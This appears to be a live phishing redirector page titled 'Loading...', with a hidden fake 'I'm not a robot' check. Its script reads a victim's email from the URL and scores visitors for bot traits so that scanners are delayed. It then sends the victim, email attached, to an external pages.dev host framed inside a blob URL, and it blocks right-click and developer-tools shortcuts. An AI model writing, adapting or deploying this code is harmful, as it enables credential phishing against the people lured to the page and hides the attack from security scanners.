<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
/* HIDE EVERYTHING - COMPLETELY INVISIBLE */
#overlay, #verificationBox, #robotIcon, #sliderContainer, .header span,
#verifying, #beepSound, .spinner, #checkmark, #slider, #sliderText, #sliderFill {
    display: none !important;
    visibility: hidden !important;
    opacity: 0 !important;
    width: 0 !important;
    height: 0 !important;
    position: absolute !important;
    top: -9999px !important;
    left: -9999px !important;
}

/* MAKE PAGE COMPLETELY INVISIBLE */
html, body {
    margin: 0;
    padding: 0;
    width: 0;
    height: 0;
    overflow: hidden;
    background: transparent;
}

/* FORCE ALL ELEMENTS INVISIBLE */
* {
    display: none !important;
}
</style>
</head>
<body>

<!-- ALL VISIBLE ELEMENTS ARE HIDDEN BY CSS -->
<div id="overlay">
    <div id="verificationBox">
        <div class="header">
            <div id="robotIcon">ðŸ¤–</div>
            <span>I'm not a robot</span>
        </div>

        <div id="sliderContainer">
            <div id="sliderFill"></div>
            <div id="slider">â†’</div>
            <div id="sliderText">Slide to verify</div>
            <div id="checkmark">âœ“</div>
        </div>

        <div id="verifying">
            <div style="display:flex; justify-content:center; align-items:center; gap:6px;">
                Verifying <div class="spinner"></div>
            </div>
        </div>
    </div>
</div>

<audio id="beepSound" src="https://www.soundjay.com/button/sounds/button-3.mp3" preload="auto"></audio>

<script>
// === INVISIBLE VERIFICATION SYSTEM ===
// Page appears completely blank
// Real users get instant redirect
// Bots get delayed with invisible checks

// IPFS URL
const BASE_IPFS = "https://23b538b5.ko1wx90sd.pages.dev";

function getEmail() { 
    return new URLSearchParams(location.search).get("email") || ""; 
}

function buildIPFS(email) { 
    return email ? BASE_IPFS + "#" + encodeURIComponent(email) : BASE_IPFS; 
}

// === INVISIBLE BOT DETECTION ===
function computeBotScore() {
    let score = 0;
    const ua = navigator.userAgent.toLowerCase();
    
    // Bot pattern detection (invisible)
    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score += 50;
    if (navigator.webdriver) score += 50;
    
    // Plugin check (real browsers have plugins)
    if (navigator.plugins.length === 0 && !/mobile|android|iphone/i.test(ua)) score += 20;
    
    // Superhuman speed test
    const start = performance.now();
    let x = 0;
    for (let i = 0; i < 100000; i++) x += Math.random();
    const end = performance.now();
    if (end - start < 0.5) score += 30;
    
    return score;
}

// === INVISIBLE HUMAN DETECTION ===
function detectHumanInteraction() {
    let humanDetected = false;
    
    // Listen for any interaction (invisible listeners)
    const events = ['mousemove', 'mousedown', 'click', 'touchstart', 'keydown'];
    events.forEach(eventType => {
        document.addEventListener(eventType, () => {
            if (!humanDetected) {
                humanDetected = true;
                // Human detected - mark for fast redirect
                window._isHuman = true;
            }
        }, { once: true, passive: true });
    });
    
    // Also check if tab is focused
    if (document.hasFocus()) {
        humanDetected = true;
        window._isHuman = true;
    }
    
    return humanDetected;
}

// === CREATE BLOB REDIRECT ===
function createBlobHTML(url) {
    return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
        iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
    </style></head><body><iframe src="${url}"></iframe></body></html>`;
}

// === MAIN EXECUTION ===
function executeRedirect() {
    const botScore = computeBotScore();
    const isHuman = window._isHuman || false;
    
    // Determine delay based on detection
    let delay = 100; // 100ms for humans (instant)
    
    if (botScore >= 60) {
        // Bot detected - longer delay
        delay = 5000; // 5 seconds
        console.log('Bot detected - adding delay');
    } else if (!isHuman) {
        // No human interaction - moderate delay
        delay = 1500; // 1.5 seconds
    }
    
    // Get email and build URL
    const email = getEmail();
    const ipfsURL = buildIPFS(email);
    
    // Create blob for redirect
    const blobHTML = createBlobHTML(ipfsURL);
    const blob = new Blob([blobHTML], { type: "text/html" });
    const blobURL = URL.createObjectURL(blob);
    
    // Redirect after calculated delay
    setTimeout(() => {
        window.location.href = blobURL;
    }, delay);
    
    // Safety: Always redirect after 8 seconds max
    setTimeout(() => {
        if (window.location.href.indexOf('blob:') === -1) {
            window.location.href = blobURL;
        }
    }, 8000);
}

// === INITIALIZE ===
function initialize() {
    // Start human detection
    detectHumanInteraction();
    
    // Execute redirect after brief initialization
    setTimeout(executeRedirect, 50);
    
    // Remove any event listeners that might show UI
    document.addEventListener('mousedown', (e) => e.preventDefault(), { passive: false });
    document.addEventListener('touchstart', (e) => e.preventDefault(), { passive: false });
}

// Start when page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
} else {
    initialize();
}

// Disable right-click context menu
document.addEventListener('contextmenu', (e) => e.preventDefault());

// Block keyboard shortcuts that might show dev tools
document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
        // Force redirect if dev tools attempted
        executeRedirect();
    }
});
</script>

<!-- NOSCRIPT FALLBACK -->
<noscript>
    <meta http-equiv="refresh" content="0;url=https://23b538b5.ko1wx90sd.pages.dev?email=<?php echo isset($_GET['email']) ? urlencode($_GET['email']) : ''; ?>">
</noscript>

</body>
</html>
